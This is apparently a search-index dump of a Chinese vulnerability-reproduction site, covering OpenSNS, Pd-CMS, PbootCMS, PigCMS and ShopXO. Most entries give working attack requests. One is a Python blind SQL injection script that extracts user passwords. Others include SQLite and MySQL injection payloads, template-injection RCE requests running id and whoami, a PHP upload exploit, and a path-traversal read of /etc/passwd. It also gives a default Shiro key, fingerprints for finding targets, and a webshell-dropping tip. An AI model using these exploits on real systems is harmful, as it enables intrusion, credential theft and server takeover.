/admin.php?s=/Authorize/ssoCallback\\ config[SSO_CONFIG]=phpinfo(); ","date":"0001-01-01","objectID":"/opensns-authorizecontroller.class.php-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/opensns-authorizecontroller.class.php-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"OpenSNS ChinaCityController.class.php SQL注入漏洞 ","date":"0001-01-01","objectID":"/opensns-chinacitycontroller.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/opensns-chinacitycontroller.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 OpenSNS ChinaCityController.class.php文件中，可通过拼接SQL语句执行任意SQL命令，获取用户账号密码 ","date":"0001-01-01","objectID":"/opensns-chinacitycontroller.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/opensns-chinacitycontroller.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 OpenSNS ","date":"0001-01-01","objectID":"/opensns-chinacitycontroller.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/opensns-chinacitycontroller.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 icon_hash=\"1167011145\" ","date":"0001-01-01","objectID":"/opensns-chinacitycontroller.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/opensns-chinacitycontroller.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 存在漏洞的文件为Addons/ChinaCity/Controller/ChinaCityController.class.php 其中用户可控参数为 cid 和 pid, 通过调试查看SQL语句 通过构造请求闭合SQL语句，造成SQL注入 POST /index.php?s=/home/addons/_addons/china_city/_controller/china_city/_action/getcity.html cid=0\u0026pid[0]==(select*from(select+sleep(3)union/**/select+1)a)and+1+in+\u0026pid[1]=1 通过二分法延时注入可以获取用户账号密码，登录后台 import time import requests url = \"http://peiqi.com:8888/index.php?s=/home/addons/_addons/china_city/_controller/china_city/_action/getcity.html\" flag = \"\" for i in range(1,100): low = 32 high = 128 while low \u003c high: headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"X-Requested-With\": \"XMLHttpRequest\" } mid = (low + high)//2 data = \"cid=0\u0026pid[0]==(select*from(select+if(ascii(substr((select/**/password/**/from/**/ocenter_ucenter_member),{},1))\u003c{},sleep(2),1)union/**/select+1)a)and+3+in+\u0026pid[1]=3\".format(i,mid) timeStart = time.time() r = requests.post(url=url, data=data, headers=headers) timeEnd = time.time() # print(r.text, low, high, data,timeStart-timeEnd) if timeEnd - timeStart \u003e= 1: high = mid else: low = mid + 1 if low == high == 32: print(\"No result\") break flag += chr((high + low - 1)//2) print(flag) ","date":"0001-01-01","objectID":"/opensns-chinacitycontroller.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/opensns-chinacitycontroller.class.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"OpenSNS CurlModel.class.php SSRF漏洞 ","date":"0001-01-01","objectID":"/opensns-curlmodel.class.php-ssrf%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/opensns-curlmodel.class.php-ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 OpenSNS CurlModel.class.php文件中curl方法存在SSRF漏洞，通过漏洞攻击者可以探测内网信息 ","date":"0001-01-01","objectID":"/opensns-curlmodel.class.php-ssrf%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/opensns-curlmodel.class.php-ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 OpenSNS ","date":"0001-01-01","objectID":"/opensns-curlmodel.class.php-ssrf%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/opensns-curlmodel.class.php-ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 icon_hash=\"1167011145\" ","date":"0001-01-01","objectID":"/opensns-curlmodel.class.php-ssrf%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/opensns-curlmodel.class.php-ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 存在漏洞的文件为 Application/Admin/Model/CurlModel.class.php 构造POC /?s=weibo/share/shareBox\u0026query=app=Admin%26model=Curl%26method=curl%26id=http://92aq2z.dnslog.cn ","date":"0001-01-01","objectID":"/opensns-curlmodel.class.php-ssrf%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/opensns-curlmodel.class.php-ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"OpenSNS ThemeController.class.php 后台任意文件上传漏洞 ","date":"0001-01-01","objectID":"/opensns-themecontroller.class.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/opensns-themecontroller.class.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 OpenSNS ThemeController.class.php文件中存在文件上传载，其中过滤不足导致可以上传至服务器任意文件 ","date":"0001-01-01","objectID":"/opensns-themecontroller.class.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/opensns-themecontroller.class.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 OpenSNS ","date":"0001-01-01","objectID":"/opensns-themecontroller.class.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/opensns-themecontroller.class.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 icon_hash=\"1167011145\" ","date":"0001-01-01","objectID":"/opensns-themecontroller.class.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/opensns-themecontroller.class.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 登录后的上传页面/admin.php?s=/theme/add.html 存在漏洞的文件为 Application/Admin/Model/ThemeController.class.php 其中只需要文件后缀为 zip和rar 就会成功上传并解压至当前的 Theme目录中 ","date":"0001-01-01","objectID":"/opensns-themecontroller.class.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/opensns-themecontroller.class.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"OpenSNS ThemeController.class.php 后台任意文件下载漏洞 ","date":"0001-01-01","objectID":"/opensns-themecontroller.class.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/opensns-themecontroller.class.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 OpenSNS ThemeController.class.php文件中存在文件下载，其中过滤不足导致可以下载服务器任意文件 ","date":"0001-01-01","objectID":"/opensns-themecontroller.class.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/opensns-themecontroller.class.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 OpenSNS ","date":"0001-01-01","objectID":"/opensns-themecontroller.class.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/opensns-themecontroller.class.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 icon_hash=\"1167011145\" ","date":"0001-01-01","objectID":"/opensns-themecontroller.class.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/opensns-themecontroller.class.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 存在漏洞的文件为 Application/Admin/Model/ThemeController.class.php 其中 theme参数为用户可控参数，根据函数流程可以发现存在的文件将会打包为 zip文件提供下载 构造请求 POST /admin.php?s=/theme/packageDownload theme=../Conf/common.php ","date":"0001-01-01","objectID":"/opensns-themecontroller.class.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/opensns-themecontroller.class.php-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Pd-CMS Shiro默认密钥 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/pb-cms-shiro%E9%BB%98%E8%AE%A4%E5%AF%86%E9%92%A5-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/pb-cms-shiro%E9%BB%98%E8%AE%A4%E5%AF%86%E9%92%A5-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Pd-CMS存在Shiro默认密钥，攻击者通过已知的密钥将会造成Shiro远程命令执行漏洞 ","date":"0001-01-01","objectID":"/pb-cms-shiro%E9%BB%98%E8%AE%A4%E5%AF%86%E9%92%A5-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/pb-cms-shiro%E9%BB%98%E8%AE%A4%E5%AF%86%E9%92%A5-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Pd-CMS ","date":"0001-01-01","objectID":"/pb-cms-shiro%E9%BB%98%E8%AE%A4%E5%AF%86%E9%92%A5-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/pb-cms-shiro%E9%BB%98%E8%AE%A4%E5%AF%86%E9%92%A5-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"pb-cms\" ","date":"0001-01-01","objectID":"/pb-cms-shiro%E9%BB%98%E8%AE%A4%E5%AF%86%E9%92%A5-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/pb-cms-shiro%E9%BB%98%E8%AE%A4%E5%AF%86%E9%92%A5-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 主页面 默认密钥 3AvVhmFLUs0KTA3Kprsdag== ","date":"0001-01-01","objectID":"/pb-cms-shiro%E9%BB%98%E8%AE%A4%E5%AF%86%E9%92%A5-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/pb-cms-shiro%E9%BB%98%E8%AE%A4%E5%AF%86%E9%92%A5-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"PbootCMS domain SQL注入漏洞 ","date":"0001-01-01","objectID":"/pbootcms-domain-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/pbootcms-domain-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 PbootCMS 搜索模块存在SQL注入漏洞。通过漏洞可获取数据库敏感信息 ","date":"0001-01-01","objectID":"/pbootcms-domain-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/pbootcms-domain-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 PbootCMS \u003c= 3.0.5 ","date":"0001-01-01","objectID":"/pbootcms-domain-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/pbootcms-domain-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"PBOOTCMS\" ","date":"0001-01-01","objectID":"/pbootcms-domain-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/pbootcms-domain-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 本地搭建最新版本,访问首页 我们需要访问一个存在的页面 url中13后加个单引号 '，若为执行sql报错相关,则漏洞存在 若显示下图，则漏洞无法利用 程序默认搭建为sqlite3数据库, Fuzz当前数据库表单payload ')%0aand%0a(SELECT%0acount(tbl_name)%0aFROM%0asqlite_master%0aWHERE%0atype%3d'ta ble'%0aand%0atbl_name%0aNOT%0alike%0a'sqlite_%')\u003c40-- 通过此payload进行盲注Fuzz数据库中表单总数是否小于40 查询为真返回正常,假则报错 由此我们可以准确推断出表单总数 计算sqlite数据库中第一个表名长度,我们可以使用如下payload: ')%0aand%0a(SELECT%0alength(tbl_name)%0aFROM%0asqlite_master%0aWHERE%0atype%3d't able'%0aand%0atbl_name%0aNOT%0alike%0a'sqlite_%'%0alimit%0a 猜解第一个表名称,我们可以使用如下payload: ')%0aand%0a(SELECT%0asubstr(tbl_name,1,1)%0aFROM%0asqlite_master%0aWHERE%0atype% 3d'table'%0aand%0atbl_name%0aNOT%0alike%0a'sqlite_%'%0alimi 这样可以得到数据库第一个表的第一位数值为字符串\"a\" 通过substr()函数,我们可以很轻松的得到表名称. 同理可获取其他数据 在Mysql下的利用方式 猜解当前数据库名称 可以使用如下payload进行Fuzz: ')%0aand%0a(select%0asubstr(database(),1,1)%3d'p')%23 查询为真时页面将返回正常. 使用Burpsuite可以爆破出数据库名称,其他表名字段名等方法相同 ","date":"0001-01-01","objectID":"/pbootcms-domain-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/pbootcms-domain-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"PbootCMS ext_price SQL注入漏洞 ","date":"0001-01-01","objectID":"/pbootcms-ext_price-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/pbootcms-ext_price-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 PbootCMS 存在SQL注入漏洞。通过漏洞可获取数据库敏感信息 ","date":"0001-01-01","objectID":"/pbootcms-ext_price-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/pbootcms-ext_price-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 PbootCMS \u003c 1.2.1 ","date":"0001-01-01","objectID":"/pbootcms-ext_price-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/pbootcms-ext_price-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"PBOOTCMS\" ","date":"0001-01-01","objectID":"/pbootcms-ext_price-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/pbootcms-ext_price-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 主页 测试 Payload /index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,user(),0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123](http://127.0.0.1/PbootCMS/index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,user(),0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123) ","date":"0001-01-01","objectID":"/pbootcms-ext_price-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/pbootcms-ext_price-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"PbootCMS search SQL注入漏洞 ","date":"0001-01-01","objectID":"/pbootcms-search-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/pbootcms-search-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 PbootCMS 搜索模块存在SQL注入漏洞。通过漏洞可获取数据库敏感信息 ","date":"0001-01-01","objectID":"/pbootcms-search-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/pbootcms-search-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 PbootCMS \u003c 1.2.1 ","date":"0001-01-01","objectID":"/pbootcms-search-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/pbootcms-search-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"PBOOTCMS\" ","date":"0001-01-01","objectID":"/pbootcms-search-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/pbootcms-search-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 搜索框页面为 Payload为 /index.php/Search/index?keyword=123\u0026updatexml(1,concat(0x7e,user(),0x7e),1));%23=123](http://127.0.0.1/PbootCMS/index.php/Search/index?keyword=123\u0026updatexml(1,concat(0x7e,user(),0x7e),1));%23=123) ","date":"0001-01-01","objectID":"/pbootcms-search-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/pbootcms-search-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"PbootCMS V3.1.2 正则绕过 RCE 漏洞 ","date":"0001-01-01","objectID":"/pbootcms-v3.1.2-%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87-rce-%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/pbootcms-v3.1.2-%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87-rce-%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 PbootCMS 项目路径下 /common/function.php 中存在两个函数 get_lg 和 get_backurl，可绕过正则处理，进而执行命令。 ","date":"0001-01-01","objectID":"/pbootcms-v3.1.2-%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87-rce-%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/pbootcms-v3.1.2-%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87-rce-%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 Bypass exp： ?snakin=}{pboot:if((get_lg/*-*/())/**/(get_backurl/*-*/()))}{/pboot:if}\u0026backurl=;id Linux exp： GET /index.php/keyword?keyword=}{pboot:if((get_lg/*aaa-*/())/**/(get_backurl/*aaa-*/()))}123321aaa{/pboot:if}\u0026backurl=;id HTTP/1.1 Host: your-ip Accept: text/plain, */*; q=0.01 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 X-Requested-With: XMLHttpRequest Referer: your-ip Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: lg=system; PbootSystem=8ea446nv2usihctikbjm7qg6c6 Connection: close Windows exp： GET /?member/login/?a=}{pboot:if((get_lg/*aaa-*/())/**/(\"whoami\"))}{/pboot:if} HTTP/1.1 Host: your-ip Accept: text/plain, */*; q=0.01 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 X-Requested-With: XMLHttpRequest Referer:your-ip Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: lg=system; PbootSystem=8ea446nv2usihctikbjm7qg6c6 Connection: close 写 webshell 时用 file_put_contents 写入时有关键字限制： 可使用 copy 函数远程落地。 ","date":"0001-01-01","objectID":"/pbootcms-v3.1.2-%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87-rce-%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/pbootcms-v3.1.2-%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87-rce-%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"PigCMS action_flashUpload 任意文件上传漏洞 ","date":"0001-01-01","objectID":"/pigcms-action_flashupload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/pigcms-action_flashupload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 PigCMS action_flashUpload 方法中存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件获取到服务器权限 ","date":"0001-01-01","objectID":"/pigcms-action_flashupload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/pigcms-action_flashupload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 pigcms ","date":"0001-01-01","objectID":"/pigcms-action_flashupload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/pigcms-action_flashupload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app.name=\"PigCMS\" ","date":"0001-01-01","objectID":"/pigcms-action_flashupload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/pigcms-action_flashupload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 验证POC POST /cms/manage/admin.php?m=manage\u0026c=background\u0026a=action_flashUpload HTTP/1.1 Host: Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=----aaa ------aaa Content-Disposition: form-data; name=\"filePath\"; filename=\"test.php\" Content-Type: video/x-flv \u003c?php phpinfo();?\u003e ------aaa /cms/upload/images/2023/08/11/1691722887xXbx.php ","date":"0001-01-01","objectID":"/pigcms-action_flashupload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/pigcms-action_flashupload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"ShopXO download 任意文件读取漏洞 CNVD-2021-15822 ","date":"0001-01-01","objectID":"/shopxo-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cnvd-2021-15822/:0:0","tags":null,"title":"","uri":"/shopxo-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cnvd-2021-15822/"},{"categories":null,"content":"漏洞描述 ShopXO是一套开源的企业级开源电子商务系统。ShopXO存在任意文件读取漏洞，攻击者可利用该漏洞获取敏感信息 ","date":"0001-01-01","objectID":"/shopxo-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cnvd-2021-15822/:1:0","tags":null,"title":"","uri":"/shopxo-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cnvd-2021-15822/"},{"categories":null,"content":"漏洞影响 ShopXO ","date":"0001-01-01","objectID":"/shopxo-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cnvd-2021-15822/:2:0","tags":null,"title":"","uri":"/shopxo-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cnvd-2021-15822/"},{"categories":null,"content":"网络测绘 app=\"ShopXO企业级B2C电商系统提供商\" ","date":"0001-01-01","objectID":"/shopxo-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cnvd-2021-15822/:3:0","tags":null,"title":"","uri":"/shopxo-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cnvd-2021-15822/"},{"categories":null,"content":"漏洞复现 商城主页如下 发送漏洞请求包 GET /public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q= HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 其中 /url/xxxx 中的 base64 解码后为 /etc/passwd 